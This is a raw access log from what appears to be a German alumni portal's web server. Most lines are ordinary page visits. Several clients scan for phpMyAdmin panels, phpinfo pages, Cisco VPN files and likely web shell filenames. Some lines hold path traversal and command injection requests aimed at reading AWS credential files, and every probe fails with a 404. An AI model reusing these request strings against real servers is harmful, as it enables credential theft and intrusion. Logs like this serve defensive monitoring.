059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:05;/sql/websql/index.php?lang=en;/sql/websql/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:06;/sql/phpmyadmin4/index.php?lang=en;/sql/phpmyadmin4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:07;/admin/sysadmin/index.php?lang=en;/admin/sysadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:08;/sql/phpMyAdmin2/index.php?lang=en;/sql/phpMyAdmin2/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:08;/php-my-admin/index.php?lang=en;/php-my-admin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:09;/db/phpmyadmin4/index.php?lang=en;/db/phpmyadmin4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:10;/__phpmyadmin/index.php?lang=en;/__phpmyadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:11;/phpMyAdmin1/index.php?lang=en;/phpMyAdmin1/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:12;/db/phpMyAdmin-4/index.php?lang=en;/db/phpMyAdmin-4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:12;/phpMyadmin/index.php?lang=en;/phpMyadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:13;/phpmyadmin6/index.php?lang=en;/phpmyadmin6/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:14;/administrator/phpmyadmin/index.php?lang=en;/administrator/phpmyadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:15;/mysqlmanager/index.php?lang=en;/mysqlmanager/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:15;/phpMyAdmin2/index.php?lang=en;/phpMyAdmin2/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:16;/phpmyAdmin/index.php?lang=en;/phpmyAdmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:17;/admin/web/index.php?lang=en;/admin/web/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:18;/PMA/index.php?lang=en;/PMA/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:19;/phpMyAdmin5/index.php?lang=en;/phpMyAdmin5/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:19;/phpmyadmin3/index.php?lang=en;/phpmyadmin3/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:20;/phpmyadmin2017/index.php?lang=en;/phpmyadmin2017/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:21;/phpMyAdmin4/index.php?lang=en;/phpMyAdmin4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:22;/phpMyAdmin-4/index.php?lang=en;/phpMyAdmin-4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:22;/administrator/web/index.php?lang=en;/administrator/web/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:23;/administrator/admin/index.php?lang=en;/administrator/admin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:24;/mysqladmin/index.php?lang=en;/mysqladmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:25;/mysql/web/index.php?lang=en;/mysql/web/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:26;/phpMyAdmin-5.1.1/index.php?lang=en;/phpMyAdmin-5.1.1/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:26;/db/myadmin/index.php?lang=en;/db/myadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:27;/admin/sqladmin/index.php?lang=en;/admin/sqladmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:28;/phpmyadmin2018/index.php?lang=en;/phpmyadmin2018/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:29;/phpMyAdmin_/index.php?lang=en;/phpMyAdmin_/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:29;/sql/webadmin/index.php?lang=en;/sql/webadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:30;/administrator/PMA/index.php?lang=en;/administrator/PMA/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:31;/admin/index.php?lang=en;/admin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:32;/db/webdb/index.php?lang=en;/db/webdb/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:33;/database/index.php?lang=en;/database/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:33;/phpMyAdmin-5/index.php?lang=en;/phpMyAdmin-5/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:34;/db/db-admin/index.php?lang=en;/db/db-admin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:35;/db/dbadmin/index.php?lang=en;/db/dbadmin/index.php?lang=en;GET;404
85ffbfe1cb8d9a84c7198c59f85b936d8b5af41e8a43711c0b0f8c8210660f90;2025-11-01 03:49:42;;/gruppen/hobby/philosophie;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:50:57;;/;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:50:59;;/themen;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:01;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:03;;/personen/all/3;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:05;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:07;;/themen/details/abschied-aus-moabit;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:09;;/personen/all/5;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:11;;/gruppen/hobby/elektronikbasteln;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:13;;/gruppen/hobby/einzelsportarten;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:15;;/themen/details/david-gegen-goliath;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:17;;/themen/details/was-kommt-nach-dem-abitur;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:19;;/themen?category=kultur;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:21;;/themen?category=wissenschaft;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:23;;/aktuelles/meldungen?category=wissenschaft;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:25;;/aktuelles/meldungen?category=community;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:27;;/personen/alumni/details/andie-jahnke;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:29;;/personen/alumni/details/sebastian-langhorst;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:31;;/personen/alumni/details/thomas-matzig;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:33;;/personen/alumni/details/johanna-schley;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:35;;/themen?category=community;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:37;;/themen?category=bildung;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:39;;/themen?category=politik;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:41;;/personen/alumni/details/benjamin-voigt;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:43;;/themen/details/der-start-ins-studium;GET;200
70ea0ccde28a1426a299b98c8c1f81dc233305dddf164075781ded36a73d6cd4;2025-11-01 03:56:05;;/gruppen/hobby/astronomie;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-01 03:58:33;/personen/alumni/schule/65286;/personen/alumni/schule/5501;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-01 03:59:56;/personen/alumni/schule/65286;/aktuelles/stellenangebote;GET;200
5cd5794b5066a0c224fc0e3da4c9966010470d84fae4b46312e140f7b8af169b;2025-11-01 04:01:07;/;/;GET;200
b42a9557e525ab985763f262d848d9dac7f15c29762f479be527e4e4d040ade9;2025-11-01 04:02:35;;/gruppen/hobby/kulturelle-studien;GET;200
f0752a443ea60fb3be623b8363882614f64a6d3506f04725e723e0da9496b085;2025-11-01 04:09:01;;/personen/alumni/details/lisa-stache;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-01 04:14:17;/gruppen;/gruppen/interesse/datenanalyse-und-forschung;GET;200
df3ec42c151d689164950cd8196970c89060cc1f49f8c46f1c797e1e3570e44e;2025-11-01 04:15:42;;/personen/alumni/schule/HB0001;GET;200
05b86f56a477ba679eea68b32602c6aca4c935a53cff1657fd9b3c2a8c4ac25e;2025-11-01 04:22:50;;/gruppen/interesse/teamarbeit;GET;200
2113021e2c6dc29b9dc3412df2fb008b3429aa9cb44334c552afc34c6ad03b2b;2025-11-01 04:27:59;;/epa/scripts/win/nsepa_setup.exe;HEAD;404
327a19b500f2a3b07a64a2ab9fbd6edcf97af6661cd9fbae3f1bf57ee13ce2b4;2025-11-01 04:30:44;;/personen/alumni/details/johanna-schley;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-01 04:34:15;/personen/alumni/schule/65286;/personen/alumni/schule/68457;GET;200
3d8d05706a93214cd7ee08e6f0f505eb9a6ab91a64b32fb6c5d60b86cfeb46de;2025-11-01 04:34:27;;/personen/alumni/details/jana-zenker;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-01 04:35:37;/gruppen/hobby/reisen;/personen/alumni/details/heidi-burghard;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-01 04:37:05;/gruppen;/gruppen/hobby/yoga-und-meditation;GET;200
a477ccd741bb54b6cb849c60e95108e5bff44ed75478eda17e836529b5250432;2025-11-01 04:37:39;;/personen/alumni/details/jeanette-stephan;GET;200
c7eb044e2d7178db5e77c6a790850b8942a933682942b94fd969cc2d7f66a772;2025-11-01 04:41:24;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
1e8728677d4c953b723a1fc6ddcadefd8cc96cc5db939c175414b34555ec1911;2025-11-01 04:41:45;;/;GET;200
70d8f607df2188fa6b220ee42b7008ce9c5a9c1806495cb505a4ed12e7f07ae4;2025-11-01 04:44:42;;/gruppen/interesse/weiterbildung-und-training;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-01 04:50:34;/personen/alumni/schule/65286;/personen/alumni/schule/183052;GET;200
de22e480c71d13bd8407de0ba3a1a8b89713404cfb64ee367787d33c429f8d8e;2025-11-01 04:51:39;;/personen/alumni/details/benjamin-voigt;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-01 04:51:57;/personen/alumni/details/thomas-matzig;/gruppen/hobby/physik;GET;200
235d05b781fa35b8e343c3a25ed05d0e53513908231e0bab8b5632fd8555ac23;2025-11-01 04:52:33;;/;GET;200
38c5215bf079512ec38674d21bf1154d49eda5e2a2320a31bbfc51cb444fb3da;2025-11-01 04:56:30;;/;GET;200
7c2b63ec45d3ea30876afcb61e1c33ceaa398923383aeb47ff28c06bf87c07e8;2025-11-01 04:59:04;;/gruppen/interesse/selbststandigkeit;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-01 05:06:05;/gruppen;/gruppen/interesse/teamarbeit;GET;200
d168f5e1ca2b775d0ab83abd3aba70c8d6144f83e40b9449551833b8d2809adb;2025-11-01 05:07:58;;/themen?category=politik;GET;200
361fa73d63a8009d91458b7cc71628fa5ebd9235c8fec0e91345ccae713154d7;2025-11-01 05:08:29;/themen/details/fotografie-als-kunst-und-ausdruck;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
9b04f64bc3d205ce27913f3a888d4c6064e2cfeff6ce408d1acd8cc5e7f34c10;2025-11-01 05:16:18;;/personen/alumni/details/sidney-dittrich;GET;200
1272d73726d957da4076e0c395f458119704d3ab7f58bcd14b074d677b4c5b3c;2025-11-01 05:17:58;;/personen/alumni/details/andie-jahnke;GET;200
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:41;;/;GET;200
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:41;;/phpinfo;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:42;;/_profiler/phpinfo;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:44;;/info;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:44;;/phpinfo.php;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:45;;/info.php;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:48;;//pms?module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:48;;//admin/config?cmd=cat+/root/.aws/credentials;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:48;;//.aws/credentials;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:48;;//home/user/.aws/credentials;GET;404
e01d9934f82b3c60814837bc39f80cbf8b2782fa72fc3af1a4c434a634cd79b0;2025-11-01 05:24:33;;/gruppen/interesse/entrepreneurship;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:30;;/;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:31;/;/;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:32;/;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:33;/;/themen/details/der-start-ins-studium;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:35;/;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:36;/;/personen;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:37;/;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:38;/;/aktuelles/stellenangebote;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:39;/;/themen/details/abschied-aus-moabit;GET;200
7389726564a054409c002336386e298c3e131cf0a80a73bf186c0327ed301608;2025-11-01 05:34:33;;/gruppen/plausch/ai-driven-programme;GET;200
df798ab880fbd964f3cce1114fef28c993ea85d06567ceeb7c0638af95f00b93;2025-11-01 05:36:37;;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
df798ab880fbd964f3cce1114fef28c993ea85d06567ceeb7c0638af95f00b93;2025-11-01 05:41:40;;/themen?category=community;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-01 05:41:53;/personen/alumni/details/josephine-muller;/gruppen/hobby/journalismus;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-01 05:45:13;;/;GET;200
32a5fbb9e98db268403b7af13d6dfa5ffc040feefdc4c5c6c984589b7da28329;2025-11-01 05:54:08;;/gruppen/interesse/gesundheitswesen-und-pflege;GET;200
48c31a3bdca03ba471bbfc3b6d4587d5863e8c938f54c02764c85fbef591b991;2025-11-01 06:06:04;;/;GET;200
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:22;;/ab2g;GET;404
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:22;;/ab2h;GET;404
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:23;;/alive.php;GET;404
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:25;;/;GET;200
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:26;;/;GET;200
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:27;;/teorema505?t=1;GET;404
8ce3efbdebde98046586e2e12fce403e5973dcd91c2712024f2fc82bfec7ca4a;2025-11-01 06:11:35;;/gruppen/interesse/projektmanagement;GET;200
04090f60ffdaa1fcd65102927574956a01d2143f7989e24523077004e0a26324;2025-11-01 06:19:25;;/themen/details/was-kommt-nach-dem-abitur;GET;200
a37569f7c4836616d26f135eeab3fa4891f7f8c8c76250567317fd994959adc8;2025-11-01 06:20:01;/media/system/js/core.js;/media/system/js/core.js;GET;404
a37569f7c4836616d26f135eeab3fa4891f7f8c8c76250567317fd994959adc8;2025-11-01 06:20:02;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
a001d239d8415854b91d55e20ec9a99a2ef8faed96e494f0d26946145039be5b;2025-11-01 06:29:19;;/gruppen/interesse/kommunikationsfahigkeiten;GET;200
b3c0fd974c9fb4c5711bbc27923606cb23769c48932e0204cb2701c3f43f7eba;2025-11-01 06:32:39;;/;GET;200
5f8bcc0ab6d874bf1addcd37ce78c381310a8542854a48b9750c29995bee6a88;2025-11-01 06:48:56;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
bb4a165bbc76ea7dff873306e9bee1a028f9193be5e1f5c521fc5b0257423669;2025-11-01 06:51:17;;/;GET;200
8ad0f13c2740f25f5b9f3b94b6b7dcd9f70a2a2aea21dc7b85e5538a58fc8450;2025-11-01 07:00:01;;/+CSCOL+/Java.jar;GET;404
8ad0f13c2740f25f5b9f3b94b6b7dcd9f70a2a2aea21dc7b85e5538a58fc8450;2025-11-01 07:00:02;;/+CSCOE+/logon_forms.js;GET;404
8ad0f13c2740f25f5b9f3b94b6b7dcd9f70a2a2aea21dc7b85e5538a58fc8450;2025-11-01 07:00:03;;/+CSCOL+/a1.jar;GET;404
8ad0f13c2740f25f5b9f3b94b6b7dcd9f70a2a2aea21dc7b85e5538a58fc8450;2025-11-01 07:00:05;;/+CSCOE+/transfer.js;GET;404
d942ac9f8018c58955638f1ebf109778878197fce4872afdae283a1064670f88;2025-11-01 07:05:05;;/;GET;200
4cfb6ca9de617eec846e55bb8a06552b36acebffa9dd55728e774c3f8e59b7dc;2025-11-01 07:06:31;;/personen/alumni/details/thomas-matzig;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-01 07:09:01;;/themen;GET;200
71096274bd6a0f5b7bf23ad4cad1f46a6c4ca9137b7a17d1650b24ff9e36e14a;2025-11-01 07:11:11;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-01 07:13:12;;/veranstaltungen;GET;200
035f1509c13b28f711d829ac28154a7d223734b172d21902f89955ed6a5da8e8;2025-11-01 07:13:53;;/gruppen/hobby/film-und-videoproduktion;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:19:51;;/;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:13;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:22;;/personen;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:28;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:44;;/aktuelles/stellenangebote;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:48;;/themen/details/abschied-aus-moabit;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:22:29;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:22:46;;/themen/details/der-start-ins-studium;GET;200
7ea4b3b2b79a0a38ca66d5438e76748c131dbf9fe8d206284ea354275151ba5b;2025-11-01 07:23:39;;/gruppen/hobby/lesen;GET;200
9a6cdfa757f92d6a70234c3555e4c1b6e8c505f96c697ba49823f8083c0b220f;2025-11-01 07:27:48;;/login;GET;200
fdc5879c736ea26494e153d21a73751be39700d8592baf023943194c86ec17cd;2025-11-01 07:28:11;;/personen/alumni/details/thomas-matzig;GET;200
710f1654c872d6ab5ecffed4ec0d85ddd8044fc1fe96d8b44bd248604af21455;2025-11-01 07:28:35;;/personen/alumni/details/jessica-schwarz;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-01 07:35:01;;/aktuelles/meldungen;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-01 07:35:34;;/rechtliches/impressum;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-01 07:39:29;;/aktuelles/stellenangebote;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-01 07:40:01;;/about/allgemein;GET;200
48f817e4785ef6a7bb5fe68a5b5fd959b166fe6fb725960b5836c9feee8fcbf2;2025-11-01 07:41:07;;/gruppen;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-01 07:46:06;;/themen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:29;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:30;;/error.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:31;;/031.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:31;;/ilex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:32;;/flex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:32;;/mlex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:33;;/wlex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:33;;/wp-aaa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:34;;/klex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:34;;/about3.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:35;;/222.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:35;;/444.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:36;;/file9.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:36;;/filesss.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:37;;/file88.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:37;;/gifclass4.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:38;;/class-wp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:39;;/555.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:40;;/333.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-01 07:57:40;;/hly.php;GET;404
